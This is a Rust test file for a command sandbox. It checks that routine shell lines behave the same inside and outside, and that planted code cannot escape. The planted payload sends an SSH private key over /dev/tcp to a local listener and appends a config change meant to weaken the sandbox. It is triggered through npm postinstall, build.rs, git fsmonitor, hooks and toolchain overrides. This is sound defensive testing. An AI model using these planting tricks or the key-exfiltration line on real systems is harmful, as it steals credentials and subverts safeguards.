//! The corpus run of the spec's section 16.2 (`research/auto-corpus.md`).
//!
//! Routine lines (1-7, 13-17, 19-24, 26, 27, 29-43) run in a fixture project through
//! the real launcher and, on an identical fixture, unsandboxed with the same
//! environment and the same offline hints. Both must give the same exit status and the
//! same output class: empty, text or error. A row whose tool is missing is skipped.
//!
//! The unseen-code lines (98, 100-105, 108, 110) run with planted fixtures: a Makefile,
//! a test, a build script, a git hook, a toolchain file, a script fed to `sh`. The
//! planted code runs, inside the sandbox, and leaves no trace outside the fixture's
//! roots: no file in the home dir, no change to efr's config, no connection to a
//! listener on the host.

use std::fmt::Write as _;
use std::fs;
use std::net::TcpListener;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::process::Stdio;

use efr_sandbox::OFFLINE_HINTS;

use crate::support::{
    Fixture, Ready, command, have, run_with_timeout, sandbox_or_skip, say, write,
};

/// The kind of fixture project a line needs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Project {
    Plain,
    Git,
    Rust,
    Node,
    Go,
}

/// One routine line: its corpus number, the tools it needs, the project and the line.
struct Row {
    number: u32,
    tools: &'static [&'static str],
    project: Project,
    line: &'static str,
}

const ROUTINE: &[Row] = &[
    Row { number: 1, tools: &["ls"], project: Project::Plain, line: "pwd; ls -la" },
    Row { number: 2, tools: &["git"], project: Project::Git, line: "git status --short --branch" },
    Row {
        number: 3,
        tools: &["find"],
        project: Project::Plain,
        line: "find crates -maxdepth 2 -name Cargo.toml",
    },
    Row { number: 4, tools: &["rg"], project: Project::Plain, line: "rg TODO crates" },
    Row {
        number: 5,
        tools: &["cat"],
        project: Project::Plain,
        line: "cat crates/efr-cli/src/main.rs",
    },
    Row {
        number: 6,
        tools: &["journalctl"],
        project: Project::Plain,
        line: "journalctl -b -1 -n 80 --no-pager",
    },
    Row {
        number: 7,
        tools: &["journalctl"],
        project: Project::Plain,
        line: "journalctl -k -b --no-pager -n 20 --grep=Linux",
    },
    Row {
        number: 13,
        tools: &["lsblk", "df", "free", "uptime"],
        project: Project::Plain,
        line: "lsblk -o NAME,SIZE,TYPE; df -hT; free -h; uptime",
    },
    Row {
        number: 14,
        tools: &["ps"],
        project: Project::Plain,
        line: "ps -eo pid,ppid,comm,%cpu --sort=-%cpu | head -5",
    },
    Row { number: 15, tools: &["lscpu"], project: Project::Plain, line: "lscpu" },
    Row {
        number: 16,
        tools: &["du", "sort", "head"],
        project: Project::Plain,
        line: "du -h -d 2 ~ | sort -hr | head",
    },
    Row {
        number: 17,
        tools: &["cat"],
        project: Project::Plain,
        line: "cat /proc/pressure/cpu /proc/pressure/memory",
    },
    Row {
        number: 19,
        tools: &["pacman"],
        project: Project::Plain,
        line: "pacman -Q | head -3; pacman -Qi pacman",
    },
    Row { number: 20, tools: &["cargo"], project: Project::Rust, line: "cargo build -q" },
    Row { number: 21, tools: &["cargo", "rustfmt"], project: Project::Rust, line: "cargo fmt" },
    Row { number: 22, tools: &["cargo"], project: Project::Rust, line: "cargo test -q" },
    Row { number: 23, tools: &["npm", "node"], project: Project::Node, line: "npm run build" },
    Row { number: 24, tools: &["make"], project: Project::Plain, line: "make" },
    Row {
        number: 26,
        tools: &["git"],
        project: Project::Git,
        line: "print change >> README.md; git add -A && git commit -qm change",
    },
    Row { number: 27, tools: &["git"], project: Project::Git, line: "git switch -q feat" },
    Row {
        number: 29,
        tools: &["git"],
        project: Project::Git,
        line: "print change >> README.md; git stash push -q && git stash pop -q",
    },
    Row {
        number: 30,
        tools: &["git"],
        project: Project::Git,
        line: "git log --oneline -20; git diff; git show HEAD --stat",
    },
    Row { number: 31, tools: &[], project: Project::Plain, line: "mkdir tmp-x && rmdir tmp-x" },
    Row {
        number: 32,
        tools: &["touch", "mv"],
        project: Project::Plain,
        line: "touch notes.md; mv a.rs b.rs",
    },
    Row { number: 33, tools: &["rm"], project: Project::Plain, line: "rm target/*.o" },
    Row {
        number: 34,
        tools: &["cargo"],
        project: Project::Rust,
        line: "cargo tree; cargo metadata --format-version 1 > /dev/null",
    },
    Row { number: 35, tools: &["uv"], project: Project::Plain, line: "uv run pytest" },
    Row { number: 36, tools: &["tsc"], project: Project::Node, line: "tsc --noEmit" },
    Row {
        number: 37,
        tools: &["go"],
        project: Project::Go,
        line: "go build ./... && go vet ./...",
    },
    Row {
        number: 38,
        tools: &["pgrep"],
        project: Project::Plain,
        line: "pgrep -a pacman; pgrep node",
    },
    Row {
        number: 39,
        tools: &["edid-decode"],
        project: Project::Plain,
        line: "edid-decode /sys/class/drm/card1-DP-1/edid",
    },
    Row {
        number: 40,
        tools: &["coredumpctl"],
        project: Project::Plain,
        line: "coredumpctl list --no-pager",
    },
    Row {
        number: 41,
        tools: &["swapon", "df"],
        project: Project::Plain,
        line: "swapon --show; df -i",
    },
    Row { number: 42, tools: &["cat"], project: Project::Plain, line: "cat ~/.cargo/config.toml" },
    Row {
        number: 43,
        tools: &["ls", "du"],
        project: Project::Plain,
        line: "ls ~/.cache ; du -d1 ~/.cache",
    },
];

/// The caches a contained call gets, in the fixture's home.
const CACHES: &[&str] = &[".cargo", ".cache", ".npm", "go/pkg/mod"];

/// What a run printed, as the corpus compares it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Class {
    Empty,
    Text,
    Error,
}

fn class(status: i32, stdout: &str, stderr: &str) -> Class {
    if status != 0 {
        Class::Error
    } else if stdout.trim().is_empty() && stderr.trim().is_empty() {
        Class::Empty
    } else {
        Class::Text
    }
}

/// A fixture with the project files a row needs and the caches mounted.
fn fixture(ready: &Ready, project: Project) -> Fixture {
    let mut fixture = Fixture::new(ready);
    let p = fixture.project.clone();
    write(&p.join("crates/efr-cli/Cargo.toml"), "[package]\nname = \"efr-cli\"\n");
    write(&p.join("crates/efr-cli/src/main.rs"), "// TODO: more\nfn main() {}\n");
    write(&p.join("a.rs"), "fn a() {}\n");
    write(&p.join("target/x.o"), "obj\n");
    write(&p.join("Makefile"), "all:\n\techo made > made.txt\n");
    write(&p.join("tests/test_x.py"), "def test_x():\n    assert True\n");
    write(&p.join("pyproject.toml"), "[project]\nname = \"x\"\nversion = \"0.1.0\"\n");
    write(&fixture.home.join(".cargo/config.toml"), "[net]\nretry = 2\n");
    write(&fixture.home.join(".cache/tool/entry"), "cached\n");
    match project {
        Project::Plain => {}
        Project::Git => {
            fixture.git_init();
            let git = |args: &[&str]| {
                command("git")
                    .args(args)
                    .current_dir(&p)
                    .envs(&fixture.env)
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .status()
                    .unwrap()
            };
            assert!(git(&["branch", "feat"]).success());
        }
        Project::Rust => {
            write(
                &p.join("Cargo.toml"),
                "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n\
                 [workspace]\n",
            );
            write(&p.join("src/main.rs"), "fn main() {\n    println!(\"hi\");\n}\n");
            write(&p.join("tests/it.rs"), "#[test]\nfn works() {\n    assert_eq!(1 + 1, 2);\n}\n");
        }
        Project::Node => {
            write(
                &p.join("package.json"),
                "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"build\":\"node -e \\\"console.log('built')\\\"\"}}\n",
            );
            write(&p.join("tsconfig.json"), "{\"compilerOptions\":{\"strict\":true}}\n");
            write(&p.join("src/index.ts"), "export const x: number = 1;\n");
        }
        Project::Go => {
            write(&p.join("go.mod"), "module example.com/x\n\ngo 1.21\n");
            write(&p.join("main.go"), "package main\n\nfunc main() {}\n");
        }
    }
    for cache in CACHES {
        let path = fixture.home.join(cache);
        fs::create_dir_all(&path).unwrap();
        fixture.cache(&path);
    }
    for (name, value) in [
        ("RUSTUP_HOME", rustup_home()),
        ("RUSTUP_TOOLCHAIN", crate::support::env_var("RUSTUP_TOOLCHAIN").unwrap_or_default()),
    ] {
        if !value.is_empty() {
            fixture.env.insert(name.into(), value.into());
        }
    }
    fixture
}

/// The user's rustup home: read-only inside, it holds the toolchains.
fn rustup_home() -> String {
    crate::support::env_var("RUSTUP_HOME").unwrap_or_else(|| {
        let home = crate::support::env_var("HOME").unwrap_or_default();
        format!("{home}/.rustup")
    })
}

/// Runs `line` in `fixture` without a sandbox, with its environment and the offline
/// hints a contained call gets.
fn unsandboxed(fixture: &Fixture, line: &str) -> (i32, String, String) {
    let mut zsh = command("zsh");
    zsh.args(["-fc", line])
        .current_dir(&fixture.project)
        .env_clear()
        .envs(&fixture.env)
        .envs(OFFLINE_HINTS.iter().copied())
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    run_with_timeout(zsh)
}

#[test]
fn corpus_routine_lines_match_an_unsandboxed_run() {
    let ready = sandbox_or_skip!();
    let mut report = String::new();
    let mut mismatches = Vec::new();
    for row in ROUTINE {
        if let Some(missing) = row.tools.iter().find(|tool| !have(tool)) {
            let _ = writeln!(report, "corpus {}: skipped: {missing} is not installed", row.number);
            continue;
        }
        let inside = fixture(&ready, row.project);
        let outside = fixture(&ready, row.project);
        let run = inside.run(row.line);
        let (status, stdout, stderr) = unsandboxed(&outside, row.line);
        let sandboxed = (run.status, class(run.status, &run.stdout, &run.stderr));
        let plain = (status, class(status, &stdout, &stderr));
        let setup = run.result().setup_error.clone();
        let _ = writeln!(
            report,
            "corpus {}: sandboxed {sandboxed:?}, unsandboxed {plain:?}{}",
            row.number,
            setup.as_ref().map(|error| format!(", setup error {error}")).unwrap_or_default()
        );
        if sandboxed != plain || setup.is_some() {
            mismatches.push(format!(
                "corpus {} `{}`: sandboxed {sandboxed:?} stderr {:?}; unsandboxed {plain:?} \
                 stderr {stderr:?}",
                row.number, row.line, run.stderr
            ));
        }
    }
    say(&report);
    assert!(mismatches.is_empty(), "{}", mismatches.join("\n"));
}

/// One unseen-code line: what to plant, the line, and the tools it needs.
struct Planted {
    number: u32,
    tools: &'static [&'static str],
    project: Project,
    /// Plants the fixture; gets the project, the home and the host port to leak to.
    plant: fn(&Path, &Path, u16),
    line: &'static str,
}

/// The shell text that tries every way out: a file in the home dir, efr's config, and
/// a connection to the host's listener. It also leaves a marker in the project, which
/// shows that the planted code did run.
fn payload(port: u16) -> String {
    format!(
        "echo ran > ./planted-ran; echo pwned > $HOME/pwned; \
         echo 'mode = \"auto\"' >> $HOME/.config/efr/config.toml; \
         cat $HOME/.ssh/id_ed25519 > /dev/tcp/127.0.0.1/{port}"
    )
}

fn script(path: &Path, port: u16) {
    write(path, &format!("#!/bin/bash\n{}\nexit 0\n", payload(port)));
    fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
}

const PLANTED: &[Planted] = &[
    Planted {
        number: 98,
        tools: &["make", "bash"],
        project: Project::Plain,
        plant: |project, _, port| {
            script(&project.join("build.sh"), port);
            write(&project.join("Makefile"), "all:\n\t./build.sh\n");
        },
        line: "make",
    },
    Planted {
        number: 100,
        tools: &["make", "bash"],
        project: Project::Plain,
        plant: |project, _, port| {
            write(
                &project.join("Makefile"),
                &format!("all:\n\tbash -c '{}'\n", payload(port).replace('$', "$$")),
            );
        },
        line: "make",
    },
    Planted {
        number: 101,
        tools: &["npm", "node", "bash"],
        project: Project::Node,
        plant: |project, _, port| {
            script(&project.join("post.sh"), port);
            write(
                &project.join("package.json"),
                "{\"name\":\"x\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"./post.sh\"}}\n",
            );
        },
        line: "npm install --no-audit --no-fund",
    },
    Planted {
        number: 102,
        tools: &["cargo", "bash"],
        project: Project::Rust,
        plant: |project, _, port| {
            script(&project.join("leak.sh"), port);
            write(
                &project.join("tests/leak.rs"),
                "#[test]\nfn leak() {\n    std::process::Command::new(\"./leak.sh\").status().unwrap();\n}\n",
            );
        },
        line: "cargo test -q",
    },
    Planted {
        number: 103,
        tools: &["cargo", "bash"],
        project: Project::Rust,
        plant: |project, _, port| {
            script(&project.join("leak.sh"), port);
            write(
                &project.join("build.rs"),
                "fn main() {\n    std::process::Command::new(\"./leak.sh\").status().unwrap();\n}\n",
            );
        },
        line: "cargo build -q",
    },
    Planted {
        number: 104,
        tools: &["git", "bash"],
        project: Project::Git,
        plant: |project, _, port| {
            script(&project.join("fsmonitor.sh"), port);
            let status = command("git")
                .args(["config", "core.fsmonitor", "./fsmonitor.sh"])
                .current_dir(project)
                .status()
                .unwrap();
            assert!(status.success());
        },
        line: "git status --short",
    },
    Planted {
        number: 105,
        tools: &["cargo", "rustup", "bash"],
        project: Project::Rust,
        plant: |project, _, port| {
            script(&project.join("planted/bin/cargo"), port);
            script(&project.join("planted/bin/rustc"), port);
            write(
                &project.join("rust-toolchain.toml"),
                &format!("[toolchain]\npath = \"{}\"\n", project.join("planted").display()),
            );
        },
        line: "cargo build -q",
    },
    Planted {
        number: 108,
        tools: &["git", "bash"],
        project: Project::Git,
        // An earlier call planted the hook in the private /tmp.
        plant: |_, _, _| {},
        line: "git -c core.hooksPath=/tmp/h commit -q --allow-empty -m x",
    },
    Planted {
        number: 110,
        tools: &["sh", "bash"],
        project: Project::Plain,
        plant: |project, _, port| {
            write(&project.join("x"), &format!("bash -c '{}'\n", payload(port)));
        },
        line: "cat x | sh",
    },
];

#[test]
fn corpus_unseen_code_leaves_no_trace_outside() {
    let ready = sandbox_or_skip!();
    let mut report = String::new();
    let mut leaks = Vec::new();
    for row in PLANTED {
        if let Some(missing) = row.tools.iter().find(|tool| !have(tool)) {
            let _ = writeln!(report, "corpus {}: skipped: {missing} is not installed", row.number);
            continue;
        }
        let mut fixture = fixture(&ready, row.project);
        if row.number == 105 {
            // A toolchain named in the environment wins over rust-toolchain.toml.
            fixture.env.remove(std::ffi::OsStr::new("RUSTUP_TOOLCHAIN"));
        }
        write(&fixture.home.join(".ssh/id_ed25519"), "PRIVATE KEY\n");
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        let port = listener.local_addr().unwrap().port();
        (row.plant)(&fixture.project, &fixture.home, port);
        if row.number == 108 {
            script(&fixture.private_tmp().join("h/pre-commit"), port);
        }
        let config = fs::read_to_string(fixture.config.join("config.toml")).unwrap();
        let run = fixture.run(row.line);
        let ran = fixture.project.join("planted-ran").exists();
        let mut trace = Vec::new();
        if fixture.home.join("pwned").exists() {
            trace.push("a file in the home dir");
        }
        if fs::read_to_string(fixture.config.join("config.toml")).unwrap() != config {
            trace.push("a change to efr's config");
        }
        if listener.accept().is_ok() {
            trace.push("a connection to the host");
        }
        let _ = writeln!(
            report,
            "corpus {}: status {}, planted code ran inside: {ran}, traces outside: {trace:?}",
            row.number, run.status
        );
        if !ran {
            leaks.push(format!(
                "corpus {}: the planted code never ran, so nothing is proved",
                row.number
            ));
        }
        if !trace.is_empty() {
            leaks.push(format!("corpus {} `{}`: {trace:?}; {run:#?}", row.number, row.line));
        }
    }
    say(&report);
    assert!(leaks.is_empty(), "{}", leaks.join("\n"));
}

#[test]
fn corpus_planted_code_runs_contained() {
    // The planted code must really run (inside), or the test above proves nothing.
    let ready = sandbox_or_skip!();
    let fixture = fixture(&ready, Project::Git);
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let row = PLANTED.iter().find(|row| row.number == 104).unwrap();
    (row.plant)(&fixture.project, &fixture.home, port);
    let run = fixture.run(&format!("{}; ls planted-ran", row.line));
    assert!(fixture.project.join("planted-ran").exists(), "{run:#?}");
    assert!(!fixture.home.join("pwned").exists());
}
